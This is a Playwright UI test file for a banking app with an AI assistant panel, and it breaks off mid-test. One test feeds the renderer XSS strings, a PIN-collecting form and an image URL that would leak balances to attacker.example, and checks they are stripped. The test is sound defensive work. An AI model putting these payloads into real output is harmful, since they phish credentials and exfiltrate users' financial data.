"""Browser pass over every page, as every persona, in Daylight and Midnight.

    uv sync --all-extras && uv run playwright install chromium
    BANKO_UI_TESTS=1 DATABASE_URL="postgresql://root@localhost:26258/defaultdb?sslmode=disable" \
        uv run pytest tests/ui -q -p no:cacheprovider

Boots the app on port 5073 with AI_SERVICE=ollama. No page may log a console
error; every page is screenshotted to artifacts/ui/."""

import datetime
import json
import os
import re
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

import pytest

pytestmark = pytest.mark.skipif(os.getenv("BANKO_UI_TESTS") != "1", reason="set BANKO_UI_TESTS=1 to run the browser pass")
playwright = pytest.importorskip("playwright.sync_api")
expect = playwright.expect

PORT = 5073
BASE = f"http://127.0.0.1:{PORT}"
OUT = Path(__file__).resolve().parents[2] / "artifacts" / "ui"
PAGES = ["/", "/accounts", "/transactions", "/cashflow", "/budget", "/recurring", "/goals", "/assistant",
         "/coach", "/agents", "/platform", "/settings"]
PERSONAS = ["maya", "sam", "riley"]

# The assistant panel tests mock the assistant API with page.route, so no
# model runs and the test decides when each answer arrives.
OLD_THREAD = "22222222-2222-4222-8222-222222222222"
NEW_THREAD = "33333333-3333-4333-8333-333333333333"
LEGACY_THREAD = "44444444-4444-4444-8444-444444444444"
OTHER_USERS_THREAD = "55555555-5555-4555-8555-555555555555"
LATER_THREAD = "77777777-7777-4777-8777-777777777777"
HISTORY = {"thread_id": OLD_THREAD, "title": "Yesterday's chat", "active_receipt": None,
           "messages": [{"role": "user", "content": "What did I spend on coffee?"},
                        {"role": "assistant", "content": "You spent $12.40 on coffee."}]}


def _sse(*events) -> str:
    return "".join(f"event: {name}\ndata: {json.dumps(data)}\n\n" for name, data in events)


ANSWER = _sse(("step", {"label": "Intent routing", "ms": 3, "status": "success"}),
              ("token", {"text": "You spent $42.10 on dining."}),
              ("answer", {"answer": "You spent $42.10 on dining.", "citations": [], "proposals": [], "cached": False,
                          "route": "aggregate", "meta": {"trace": []}}),
              ("done", {}))
TRACED = _sse(("step", {"label": "Intent routing", "ms": 3, "status": "success"}),
              ("answer", {"answer": "You spent $42.10 on dining.", "citations": [], "proposals": [], "cached": False,
                          "route": "aggregate", "meta": {"trace": [
                              {"label": "Answer cache", "detail": "miss", "ms": None, "status": "miss", "kind": "cache"},
                              {"label": "Model", "detail": "", "ms": 6339.4, "status": "success", "kind": "llm"},
                              {"label": "Aggregation SQL", "detail": "$42.10 across 3 transactions", "ms": 23.6,
                               "status": "success", "kind": "sql"}]}}),
              ("done", {}))
TITLED = "How much did I spend on dining?"
PLAN = ("planning time: 3ms\nexecution time: 76ms\n\n• group (scalar)\n│ regions: us-east-1\n│\n└── • scan\n"
        "      table: expenses@idx_expenses_user_date\n      spans: [/'a1' - /'a1']")
SPENT = {"input": 2600, "output": 350, "estimated": False, "saved": 0}
PLAN_TRACE = [{"label": "Aggregation SQL", "detail": "$42.10 across 3 transactions", "ms": 23.6, "status": "success",
               "kind": "assistant"},
              {"label": "Model", "detail": "Ollama · granite3.3:8b, 3 calls, 2,950 tokens (2,600 in, 350 out)",
               "ms": 6339.4, "status": "success", "kind": "llm"},
              {"label": "Time to answer", "detail": "", "ms": 18200.0, "status": "info", "kind": "total"}]
PLANNED = _sse(("token", {"text": "You spent $42.10 on dining."}),
               ("answer", {"answer": "You spent $42.10 on dining.", "citations": [], "proposals": [], "cached": False,
                           "route": "aggregate", "meta": {"trace": PLAN_TRACE, "explain": PLAN, "explain_cut": True,
                                                          "tokens": SPENT, "model_calls": 3, "answer_ms": 18200,
                                                          "region": "us-east-1", "db_ms": 23}}),
               ("done", {}))
CACHED = _sse(("token", {"text": "You spent $42.10 on dining."}),
              ("answer", {"answer": "You spent $42.10 on dining.", "citations": [], "proposals": [], "cached": True,
                          "route": "plan", "meta": {"trace": [{"label": "Answer cache", "detail": "hit, about 350 tokens saved",
                                                                "ms": 812.0, "status": "hit", "kind": "assistant"}],
                                                     "tokens": {"input": 0, "output": 0, "estimated": False, "saved": 350},
                                                     "model_calls": 0, "answer_ms": 1200, "cached": True}}),
              ("done", {}))
RECEIPT = _sse(("step", {"step": "ocr", "status": "done", "detail": "120 characters", "ms": 400}),
               ("receipt", {"document_id": "66666666-6666-4666-8666-666666666666", "status": "posted",
                            "merchant": "Blue Bottle", "amount": 9.75, "category": "Coffee", "thread_id": OLD_THREAD}),
               ("done", {}))
PIXEL = bytes.fromhex("47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b")


@pytest.fixture(scope="module")
def server():
    # A real boot, seeding included: conftest turns autosetup off for in-process
    # tests, and the pages here need the personas' history. They never read
    # the legacy sample expenses, so none are written into the test database.
    env = {**os.environ, "AI_SERVICE": "ollama", "COACH_KAFKA_ENABLED": "false", "BANKO_SKIP_AUTOSETUP": "0",
           "SAMPLE_DATA_COUNT": "0", "CDC_WEBHOOK_HMAC_SECRET": "dev-only-secret", "PYTHONUNBUFFERED": "1"}
    assert ":26258/" in env.get("DATABASE_URL", ""), "the browser pass runs against the test database only"
    # `python -m banko_ai` ignores its arguments, so call the click group directly.
    proc = subprocess.Popen([sys.executable, "-c", "from banko_ai.cli import cli; cli()",
                             "run", "--host", "127.0.0.1", "--port", str(PORT)],
                            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deadline = time.time() + 300
    while time.time() < deadline:
        try:
            if urllib.request.urlopen(BASE + "/api/health/ready", timeout=2).status == 200:
                break
        except Exception:
            time.sleep(2)
    else:
        proc.kill()
        pytest.fail("the app never became ready on port 5073")
    # The personas' history seeds in the background after the ready line, and
    # first waits out any seeding lease a killed earlier run left behind.
    persona_data = {}
    while time.time() < deadline + 300:
        try:
            with urllib.request.urlopen(BASE + "/api/health", timeout=5) as r:
                persona_data = json.load(r)["components"].get("persona_data") or {}
        except Exception:
            persona_data = {}
        if persona_data.get("state") in ("ready", "failed"):
            break
        time.sleep(2)
    if persona_data.get("state") != "ready":
        proc.kill()
        pytest.fail(f"the personas' history never became ready on port 5073: {persona_data or 'no answer'}")
    yield BASE
    proc.terminate()
    proc.wait(timeout=20)


@pytest.fixture(scope="module")
def browser():
    with playwright.sync_playwright() as p:
        b = p.chromium.launch()
        yield b
        b.close()


def _page(browser, theme):
    ctx = browser.new_context(color_scheme=theme, viewport={"width": 1360, "height": 900})
    page = ctx.new_page()
    errors = []
    page.on("console", lambda m: errors.append(m.text) if m.type == "error" else None)
    page.on("pageerror", lambda e: errors.append(str(e)))
    return ctx, page, errors


def _login(page, base, persona):
    page.goto(base + "/login")
    page.locator(f'form:has(input[name="username"][value="{persona}"]) button').click()
    page.wait_for_url(base + "/")


@pytest.mark.parametrize("theme", ["light", "dark"])
@pytest.mark.parametrize("persona", PERSONAS)
def test_every_page_renders_without_console_errors(server, browser, persona, theme):
    OUT.mkdir(parents=True, exist_ok=True)
    ctx, page, errors = _page(browser, theme)
    try:
        _login(page, server, persona)
        for path in PAGES:
            page.goto(server + path)
            page.wait_for_load_state("networkidle")
            assert page.locator("[data-page]").count() == 1, path
            page.screenshot(path=str(OUT / f"{persona}-{theme}-{path.strip('/') or 'dashboard'}.png"), full_page=True)
        assert not errors, errors
    finally:
        ctx.close()


def test_stream_parser_handles_error_and_abort(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        parsed = page.evaluate("""() => {
            const a = Banko.parseSSE('event: token\\ndata: {"text": "Hi"}\\n\\nevent: error\\ndata: {"message": "x"}\\n\\nevent: tok');
            return { kinds: a.events.map(e => e.event), rest: a.rest };
        }""")
        assert parsed == {"kinds": ["token", "error"], "rest": "event: tok"}

        page.route("**/api/v1/assistant/threads/failing/messages", lambda route: route.fulfill(
            status=500, content_type="application/json",
            body='{"error": "Something went wrong on our side. Please try again."}'))
        failed = page.evaluate("""async () => {
            try { await Banko.stream("/api/v1/assistant/threads/failing/messages", { body: { message: "hi" }, onEvent: () => {} }); return "finished"; }
            catch (e) { return e.message; }
        }""")
        assert failed == "Something went wrong on our side. Please try again."

        page.route("**/api/v1/assistant/threads/hanging/messages", lambda route: None)  # never answers
        stopped = page.evaluate("""async () => {
            const c = new AbortController();
            setTimeout(() => c.abort(), 300);
            try { await Banko.stream("/api/v1/assistant/threads/hanging/messages", { body: { message: "hi" }, signal: c.signal, onEvent: () => {} }); return "finished"; }
            catch (e) { return e.name; }
        }""")
        assert stopped == "AbortError"
    finally:
        ctx.close()


def test_errors_people_see_are_plain_words(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        page.route("**/api/v1/transactions?q=*", lambda route: route.fulfill(
            status=503, json={"error": "warming_up", "detail": "waiting for the database (OperationalError)"}))
        seen = page.evaluate("""async () => {
            const out = {};
            try { null.accounts; } catch (e) { out.script = Banko.explain(e); }
            try { await Banko.api("http://127.0.0.1:9/api/v1/me"); } catch (e) { out.offline = Banko.explain(e); }
            try { await Banko.api("/api/v1/transactions?q=coffee"); } catch (e) { out.warming = Banko.explain(e); }
            out.message = Banko.explain(new Banko.ApiError(400, "Pick a category"));
            out.code = Banko.explain(new Banko.ApiError(503, "warming_up"));
            out.unknown = Banko.explain(new Banko.ApiError(500, "some_new_code"));
            out.nothing = Banko.explain(undefined);
            out.fallback = Banko.FALLBACK;
            return out;
        }""")
        fallback = seen.pop("fallback")
        assert seen["script"] == seen["offline"] == seen["unknown"] == seen["nothing"] == fallback
        assert seen["message"] == "Pick a category"
        assert seen["warming"] == seen["code"]
        assert "warming up" in seen["code"].lower()
        for text in seen.values():
            assert "warming_up" not in text and "OperationalError" not in text and "fetch" not in text.lower()
    finally:
        ctx.close()


def test_assistant_markup_is_sanitized(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "maya")
        html = page.evaluate("""() => DOMPurify.sanitize(marked.parse('<img src=x onerror=alert(1)><script>alert(2)</script>**ok**'))""")
        assert "onerror" not in html and "<script" not in html and "<strong>ok</strong>" in html
        plain = page.evaluate("""() => Banko.stripCitations('Lunch [txn:abc] and [ txn : 1234 ] done')""")
        assert plain == "Lunch and done"
        # What the assistant really renders: one answer must not be able to
        # blank the app, collect a PIN, or fetch an outside image.
        hostile = ("**ok** <style>body{display:none}</style>\n\n"
                   "<form action='https://attacker.example/steal'><input name=pin><button>Verify</button></form>\n\n"
                   "![chart](https://attacker.example/p.png?q=balances) <img src=x onerror=alert(1)><script>alert(2)</script>\n\n"
                   "[click](javascript:alert(1)) and [the docs](https://www.cockroachlabs.com/docs/)\n\n"
                   "| Category | Total |\n|:--|--:|\n| Dining | $42 |\n\n- one\n- two [txn:abc]")
        rendered = page.evaluate("(s) => Banko.renderAnswer(s)", hostile)
        for banned in ("<style", "display:none", "<form", "<input", "<button", "<img", "attacker.example",
                       "javascript:", "onerror", "<script", "[txn:"):
            assert banned not in rendered, banned
        assert "<strong>ok</strong>" in rendered and "<table>" in rendered and "<li>one</li>" in rendered
        assert 'href="https://www.cockroachlabs.com/docs/"' in rendered and 'rel="noopener noreferrer"' in rendered
    finally:
        ctx.close()


def test_expired_session_goes_to_login(server, browser):
    # Not maya: a request without a session acts as maya, the default persona.
    ctx, page, errors = _page(browser, "light")
    try:
        _login(page, server, "sam")
        page.goto(server + "/transactions")
        page.wait_for_load_state("networkidle")
        ctx.clear_cookies()
        page.locator("button.b-f").first.click()
        page.wait_for_url(server + "/login", timeout=10000)
    finally:
        ctx.close()


class _PanelApi:
    """The assistant API the panel talks to, mocked. The history of the
    remembered thread is held until release(), so a test can let the user
    act first, which is what a slow checkpoint read looks like. With
    hold_threads, creating a thread is held too, until release_threads().
    New threads take their ids from thread_ids in order, then NEW_THREAD."""

    def __init__(self, page, answer=ANSWER, history=HISTORY, hold_threads=False, thread_ids=()):
        self.held, self.fetched, self.answer, self.history = [], [], answer, history
        self.hold_threads, self.creating, self.asked = hold_threads, [], []
        self.thread_ids = list(thread_ids)
        page.route("**/api/v1/assistant/**", self._assistant)
        page.route("**/api/v1/receipts", lambda r: r.fulfill(status=200, content_type="text/event-stream", body=RECEIPT))
        page.route("**/api/v1/receipts/*/thumbnail", lambda r: r.fulfill(status=200, content_type="image/gif", body=PIXEL))
        page.route("**/api/v1/transactions?q=*", lambda r: r.fulfill(json={"items": []}))

    def _assistant(self, route):
        req = route.request
        path = urllib.parse.urlparse(req.url).path
        if req.method == "GET" and path.startswith("/api/v1/assistant/threads/"):
            self.fetched.append(path.rsplit("/", 1)[-1])
            if path.endswith(OLD_THREAD):
                self.held.append(route)
                return None
            return route.fulfill(status=404, json={"error": "not_found"})
        if req.method == "POST" and path.endswith("/messages"):
            self.asked.append(req.post_data_json["message"])
            return route.fulfill(status=200, content_type="text/event-stream", body=self.answer)
        if req.method == "POST" and path == "/api/v1/assistant/threads":
            if self.hold_threads:
                self.creating.append(route)
                return None
            made = self.thread_ids.pop(0) if self.thread_ids else NEW_THREAD
            return route.fulfill(status=201, json={"thread_id": made, "title": "New chat", "message_count": 0})
        if req.method == "GET" and path == "/api/v1/assistant/threads":
            # The server titles a thread from its first question.
            return route.fulfill(json={"threads": [{"thread_id": NEW_THREAD, "title": TITLED, "message_count": 2,
                                                    "created_at": "2026-10-13T12:00:00+00:00",
                                                    "last_message_at": "2026-10-13T12:00:05+00:00"}]})
        return route.fallback()

    def release(self):
        while self.held:
            self.held.pop(0).fulfill(status=200, json=self.history)

    def release_threads(self):
        while self.creating:
            self.creating.pop(0).fulfill(status=201, json={"thread_id": NEW_THREAD, "title": "New chat",
                                                           "message_count": 0})


def _remember_a_thread(page, base, persona) -> str:
    """Sign in, then reload with yesterday's thread remembered for this
    user, plus the entries the panel must never load: the old unkeyed one
    and another persona's."""
    _login(page, base, persona)
    uid = page.evaluate("() => Banko.shell.user.user_id")
    page.evaluate("""([uid, mine, legacy, other]) => {
        localStorage.setItem('banko.thread:' + uid, mine);
        localStorage.setItem('banko.thread', legacy);
        localStorage.setItem('banko.thread:00000000-0000-4000-8000-0000000000ff', other);
    }""", [uid, OLD_THREAD, LEGACY_THREAD, OTHER_USERS_THREAD])
    page.reload()
    page.wait_for_load_state("networkidle")
    return uid


def test_a_question_from_the_palette_survives_the_history_load(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        _remember_a_thread(page, server, "sam")
        page.keyboard.press("Control+k")
        page.locator(".b-palette input").fill("how much did I spend on dining?")
        page.keyboard.press("Enter")
        page.wait_for_timeout(500)  # the question is asked before yesterday's history comes back
        api.release()
        chat = page.locator(".b-panel .b-chat")
        expect(chat).to_contain_text("how much did I spend on dining?")
        expect(chat).to_contain_text("You spent $42.10 on dining.")
        expect(chat).to_contain_text("What did I spend on coffee?")
        page.wait_for_timeout(500)
        expect(chat).to_contain_text("You spent $42.10 on dining.")
        assert api.fetched == [OLD_THREAD]
        assert not errors, errors
    finally:
        ctx.close()


def test_a_dropped_receipt_keeps_its_card_when_the_history_loads(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        _remember_a_thread(page, server, "sam")
        page.evaluate("""() => {
            const dt = new DataTransfer();
            dt.items.add(new File(['receipt'], 'lunch.jpg', { type: 'image/jpeg' }));
            window.dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }));
        }""")
        page.wait_for_timeout(500)
        api.release()
        card = page.locator(".b-panel .b-receipt")
        expect(card).to_contain_text("Blue Bottle")
        expect(page.locator(".b-panel .b-chat")).to_contain_text("What did I spend on coffee?")
        page.wait_for_timeout(500)
        expect(card).to_contain_text("Posted · Coffee")
        assert not errors, errors
    finally:
        ctx.close()


def _drop_receipt(page):
    page.evaluate("""() => {
        const dt = new DataTransfer();
        dt.items.add(new File(['receipt'], 'lunch.jpg', { type: 'image/jpeg' }));
        window.dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }));
    }""")


def test_the_receipt_card_opens_the_agents_page_in_a_new_tab(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        _login(page, server, "sam")
        _drop_receipt(page)
        link = page.locator(".b-panel .b-receipt").get_by_role("link", name="Watch the agents")
        expect(link).to_have_attribute("target", "_blank")
        with ctx.expect_page() as opened:
            link.click()
        agents = opened.value
        agents.wait_for_load_state()
        assert urllib.parse.urlparse(agents.url).path == "/agents", agents.url
        agents.close()

        page.goto(server + "/agents")  # already watching: no link to the same page
        page.wait_for_load_state("networkidle")
        _drop_receipt(page)
        # The first upload's thread is remembered now, and its history is held until released.
        for _ in range(50):
            if api.held:
                break
            page.wait_for_timeout(100)
        api.release()
        expect(page.locator(".b-panel .b-receipt")).to_contain_text("Blue Bottle")
        expect(page.locator(".b-panel .b-receipt").get_by_role("link", name="Watch the agents")).to_have_count(0)
        assert not errors, errors
    finally:
        ctx.close()


def test_asking_about_a_nudge_opens_a_new_thread_even_when_the_history_answers_late(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page)
        uid = _remember_a_thread(page, server, "sam")
        page.evaluate("() => Banko.emit('banko:ask', { context: { kind: 'nudge', id: '77777777-7777-4777-8777-777777777777' } })")
        page.wait_for_timeout(500)
        api.release()
        expect(page.locator(".b-panel .b-panel-h")).to_contain_text("New chat")
        page.wait_for_timeout(500)
        expect(page.locator(".b-panel .b-panel-h")).to_contain_text("New chat")
        expect(page.locator(".b-panel .b-chat")).not_to_contain_text("What did I spend on coffee?")
        assert page.evaluate("(uid) => localStorage.getItem('banko.thread:' + uid)", uid) == NEW_THREAD
        assert not errors, errors
    finally:
        ctx.close()


def test_the_assistant_page_titles_the_thread_and_lists_its_trace(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=TRACED)
        _login(page, server, "sam")
        page.goto(server + "/assistant")
        page.wait_for_load_state("networkidle")
        header = page.locator(".b-assist-page .b-panel-h .t")
        expect(header).to_have_text("New conversation")
        page.locator(".b-comp textarea").fill(TITLED.lower())
        page.keyboard.press("Enter")
        expect(page.locator(".b-chat")).to_contain_text("You spent $42.10 on dining.")
        expect(header).to_have_text(TITLED)
        rows = page.locator("aside.b-trace .b-tl > div")
        expect(rows.filter(has_text="Answer cache")).to_have_text("Answer cachemiss")
        expect(rows.filter(has_text="Model")).to_have_text("Model6339 ms")
        expect(rows.filter(has_text="Aggregation SQL")).to_have_text("Aggregation SQL$42.10 across 3 transactions · 24 ms")
        assert not errors, errors
    finally:
        ctx.close()


def test_the_panel_trace_has_no_dangling_separator(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=TRACED)
        _login(page, server, "sam")
        page.evaluate("(q) => Banko.emit('banko:ask', { text: q })", TITLED)
        panel = page.locator(".b-panel")
        expect(panel.locator(".b-chat")).to_contain_text("You spent $42.10 on dining.")
        expect(panel.locator(".b-panel-h")).to_contain_text(TITLED)
        panel.get_by_role("button", name="How this was answered").click()
        rows = panel.locator(".b-trace .b-tl > div")
        expect(rows.filter(has_text="Model")).to_have_text("Model6339 ms")
        expect(rows.filter(has_text="Answer cache")).to_have_text("Answer cachemiss")
        assert not errors, errors
    finally:
        ctx.close()


def test_a_failed_thread_keeps_the_question_and_an_empty_answer_stops_loading(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=_sse(("step", {"label": "Intent routing", "ms": 3, "status": "success"}), ("done", {})))
        failing = "**/api/v1/assistant/threads"
        page.route(failing, lambda route: route.fulfill(status=500, json={"error": "Something went wrong on our side."})
                   if route.request.method == "POST" else route.fallback())
        _login(page, server, "sam")
        page.evaluate("(q) => Banko.emit('banko:ask', { text: q })", TITLED)
        panel = page.locator(".b-panel")
        expect(panel.locator("textarea")).to_have_value(TITLED)
        expect(page.locator(".b-toast.err")).to_contain_text("Something went wrong on our side.")
        expect(panel.locator(".b-msg-user")).to_have_count(0)

        page.unroute(failing)
        panel.get_by_role("button", name="Send").click()
        bot = panel.locator(".b-msg-bot")
        expect(bot.locator(".b-meta")).to_be_visible()
        expect(bot.locator(".b-skel")).to_be_hidden()
        expect(bot).to_contain_text(page.evaluate("() => Banko.FALLBACK"))
        # The browser logs the 500 this test returns; nothing else may show up.
        assert errors == ["Failed to load resource: the server responded with a status of 500 (Internal Server Error)"], errors
    finally:
        ctx.close()


def _open_panel(page):
    page.evaluate("() => Banko.emit('banko:ask', {})")
    panel = page.locator(".b-panel")
    expect(panel).to_be_visible()
    return panel


def _hold_the_stream(page):
    """The answer stream held open, so the test sends its events one at a
    time (page.route can only fulfill a whole body at once). Returns
    push(event, data) and close()."""
    page.evaluate("""() => {
        const real = window.fetch;
        window.__sse = null;
        window.fetch = (url, opts) => {
            if (!String(url).endsWith('/messages')) return real(url, opts);
            const body = new ReadableStream({ start(c) { window.__sse = c; } });
            return Promise.resolve(new Response(body, { status: 200, headers: { 'Content-Type': 'text/event-stream' } }));
        };
    }""")

    def push(name, data):
        page.wait_for_function("() => window.__sse !== null")
        page.evaluate("""([n, d]) => window.__sse.enqueue(
            new TextEncoder().encode('event: ' + n + '\\ndata: ' + JSON.stringify(d) + '\\n\\n'))""", [name, data])

    return push, lambda: page.evaluate("() => window.__sse.close()")


def test_the_question_and_a_thinking_bubble_show_before_any_answer(server, browser):
    """Send shows the question and a thinking bubble at once, before the
    thread exists or a remembered thread's history has loaded."""
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page, hold_threads=True)
        _login(page, server, "sam")
        panel = _open_panel(page)
        panel.locator("textarea").fill("where did I spend the most last week?")
        page.keyboard.press("Enter")
        expect(panel.locator(".b-msg-user > span")).to_have_text("where did I spend the most last week?")
        expect(panel.locator(".b-msg-bot .b-think")).to_have_text("Thinking…")
        assert api.creating and api.asked == []  # the thread is still being made; nothing went out yet
        api.release_threads()
        expect(panel.locator(".b-chat")).to_contain_text("You spent $42.10 on dining.")
        expect(panel.locator(".b-msg-bot .b-think")).to_be_hidden()

        _remember_a_thread(page, server, "sam")
        page.keyboard.press("Control+k")
        page.locator(".b-palette input").fill("and the week before?")
        page.keyboard.press("Enter")
        expect(panel.locator(".b-msg-user > span")).to_have_text("and the week before?")
        expect(panel.locator(".b-msg-bot .b-think")).to_be_visible()
        assert api.held and api.asked == ["where did I spend the most last week?"]
        api.release()
        expect(panel.locator(".b-msg-bot").last).to_contain_text("You spent $42.10 on dining.")
        assert not errors, errors
    finally:
        ctx.close()


def test_history_that_arrives_late_sits_above_the_new_exchange_once(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        q = "how much did I spend on dining?"
        # Read after the new turn landed, the history already holds it.
        late = {**HISTORY, "messages": HISTORY["messages"] + [
            {"role": "user", "content": q}, {"role": "assistant", "content": "You spent $42.10 on dining."}]}
        api = _PanelApi(page, history=late)
        _remember_a_thread(page, server, "sam")
        page.keyboard.press("Control+k")
        page.locator(".b-palette input").fill(q)
        page.keyboard.press("Enter")
        panel = page.locator(".b-panel")
        expect(panel.locator(".b-msg-user > span")).to_have_text([q])
        api.release()
        expect(panel.locator(".b-msg-user > span")).to_have_text(["What did I spend on coffee?", q])
        expect(panel.locator(".b-msg-bot").last).to_contain_text("You spent $42.10 on dining.")
        page.wait_for_timeout(300)
        expect(panel.locator(".b-msg-user > span")).to_have_text(["What did I spend on coffee?", q])
        expect(panel.locator(".b-msg-bot")).to_have_count(2)
        assert not errors, errors
    finally:
        ctx.close()


def test_a_second_send_while_one_is_streaming_is_ignored(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        api = _PanelApi(page, hold_threads=True)
        _login(page, server, "sam")
        panel = _open_panel(page)
        box = panel.locator("textarea")
        box.fill("first question")
        page.keyboard.press("Enter")
        box.fill("second question")
        page.keyboard.press("Enter")
        api.release_threads()
        expect(panel.locator(".b-chat")).to_contain_text("You spent $42.10 on dining.")
        page.wait_for_timeout(300)
        expect(panel.locator(".b-msg-user > span")).to_have_text(["first question"])
        expect(box).to_have_value("second question")
        assert api.asked == ["first question"]
        assert not errors, errors
    finally:
        ctx.close()


def test_a_running_step_shows_its_status_line_then_becomes_a_chip(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page)
        _login(page, server, "sam")
        push, close = _hold_the_stream(page)
        page.evaluate("(q) => Banko.emit('banko:ask', { text: q })", "show me my coffee purchases this month")
        bot = page.locator(".b-panel .b-msg-bot")
        push("step", {"key": "planner:1", "label": "Planning the steps", "detail": "", "ms": None, "status": "running"})
        expect(bot.locator(".b-think")).to_have_text("Planning the steps…")
        expect(bot.locator(".b-step.run")).to_have_text("Planning the steps")
        push("step", {"key": "planner:1", "label": "Planner", "detail": "search_transactions", "ms": 15012.4,
                      "status": "success"})
        expect(bot.locator(".b-step.run")).to_have_count(0)
        expect(bot.locator(".b-step")).to_have_text(["Planner15.0 s"])
        expect(bot.locator(".b-think")).to_have_text("Thinking…")
        push("step", {"key": "answer", "label": "Writing the answer", "detail": "", "ms": None, "status": "running"})
        push("token", {"text": "You bought coffee 9 times."})
        expect(bot.locator(".b-think")).to_have_text("Writing the answer…")
        push("step", {"key": "answer", "label": "LLM answer", "detail": "streamed", "ms": 640, "status": "success"})
        expect(bot.locator(".b-step")).to_have_text(["Planner15.0 s", "LLM answer640 ms"])
        push("answer", {"answer": "You bought coffee 9 times.", "citations": [], "proposals": [], "cached": False,
                        "route": "plan", "meta": {"trace": PLAN_TRACE, "tokens": SPENT, "model_calls": 3}})
        push("done", {})
        close()
        expect(bot.locator(".b-think")).to_be_hidden()
        assert not errors, errors
    finally:
        ctx.close()


def test_the_answer_shows_its_meta_and_plan_while_the_stream_stays_open(server, browser):
    """The answer event marks the bubble answered at once; the stream stays
    open while the turn is put away, and no new turn starts until done."""
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page)
        _login(page, server, "sam")
        push, close = _hold_the_stream(page)
        page.evaluate("(q) => Banko.emit('banko:ask', { text: q })", TITLED)
        panel = page.locator(".b-panel")
        bot = panel.locator(".b-msg-bot")
        push("token", {"text": "You spent $42.10 on dining."})
        push("answer", {"answer": "You spent $42.10 on dining.", "citations": [], "proposals": [], "cached": False,
                        "route": "aggregate", "meta": {"trace": PLAN_TRACE, "explain": PLAN, "tokens": SPENT,
                                                       "model_calls": 3, "answer_ms": 18200, "region": "us-east-1",
                                                       "db_ms": 23}})
        expect(bot.locator(".b-meta")).to_contain_text("3 model calls · 2,950 tokens")
        expect(bot.locator(".b-meta")).to_contain_text("served from us-east-1 · 23 ms in the database")
        expect(bot.locator(".b-explain pre")).to_contain_text("table: expenses@idx_expenses_user_date")
        expect(bot.locator(".b-think")).to_be_hidden()
        panel.locator("textarea").fill("one more")
        page.keyboard.press("Enter")
        page.wait_for_timeout(300)
        expect(panel.locator(".b-msg-user")).to_have_count(1)  # bookkeeping still running: it waits
        push("done", {})
        close()
        expect(panel.get_by_role("button", name="Send")).to_be_enabled()
        assert not errors, errors
    finally:
        ctx.close()


def test_the_plan_shows_under_every_answer_without_a_click(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=PLANNED)
        _login(page, server, "sam")
        page.evaluate("(q) => Banko.emit('banko:ask', { text: q })", TITLED)
        block = page.locator(".b-panel .b-msg-bot .b-explain")
        expect(block).to_be_visible()
        expect(block).to_contain_text("How CockroachDB ran it")
        expect(block).to_contain_text("plan shortened")
        expect(block.locator("pre")).to_contain_text("table: expenses@idx_expenses_user_date")
        box = block.locator("pre").evaluate("(el) => { const s = getComputedStyle(el); return [s.overflowY, s.maxHeight, s.whiteSpace]; }")
        assert box[0] == "auto" and box[1].endswith("px") and box[2] == "pre", box

        page.goto(server + "/assistant")
        page.wait_for_load_state("networkidle")
        page.locator(".b-comp textarea").fill(TITLED.lower())
        page.keyboard.press("Enter")
        on_page = page.locator(".b-assist-page .b-chat .b-explain")
        expect(on_page).to_be_visible()
        expect(on_page.locator("pre")).to_contain_text("regions: us-east-1")
        assert not errors, errors
    finally:
        ctx.close()


def test_the_plan_folds_to_its_heading_and_stays_folded(server, browser):
    """"How CockroachDB ran it" folds down to its heading so the answer gets
    the room; the next answer and a reload keep it folded until it is
    opened again."""
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=PLANNED)
        _login(page, server, "sam")
        page.goto(server + "/assistant")
        page.wait_for_load_state("networkidle")
        plans = page.locator(".b-assist-page .b-chat .b-explain")
        page.locator(".b-comp textarea").fill(TITLED.lower())
        page.keyboard.press("Enter")
        expect(plans.nth(0).locator("pre")).to_be_visible()
        plans.nth(0).get_by_role("button", name="How CockroachDB ran it").click()
        expect(plans.nth(0).locator("pre")).to_be_hidden()
        expect(plans.nth(0)).to_contain_text("How CockroachDB ran it")

        page.locator(".b-comp textarea").fill("and the week before?")
        page.keyboard.press("Enter")
        expect(plans.nth(1)).to_be_visible()
        expect(plans.nth(1).locator("pre")).to_be_hidden()

        page.goto(server + "/assistant")
        page.wait_for_load_state("networkidle")
        page.locator(".b-comp textarea").fill(TITLED.lower())
        page.keyboard.press("Enter")
        expect(plans.nth(0)).to_be_visible()
        expect(plans.nth(0).locator("pre")).to_be_hidden()
        plans.nth(0).get_by_role("button", name="How CockroachDB ran it").click()
        expect(plans.nth(0).locator("pre")).to_be_visible()
        assert not errors, errors
    finally:
        ctx.close()


def test_the_trace_panel_follows_the_conversation_on_screen(server, browser):
    """New conversation clears "How this was answered" at once, and an
    answer that lands for the conversation put away never shows in it."""
    ctx, page, errors = _page(browser, "light")
    try:
        _PanelApi(page, answer=TRACED, thread_ids=[NEW_THREAD, LATER_THREAD])
        _login(page, server, "sam")
        page.goto(server + "/assistant")
        page.wait_for_load_state("networkidle")
        aside = page.locator("aside.b-trace")
        rows = aside.locator(".b-tl > div")
        page.locator(".b-comp textarea").fill(TITLED.lower())
        page.keyboard.press("Enter")
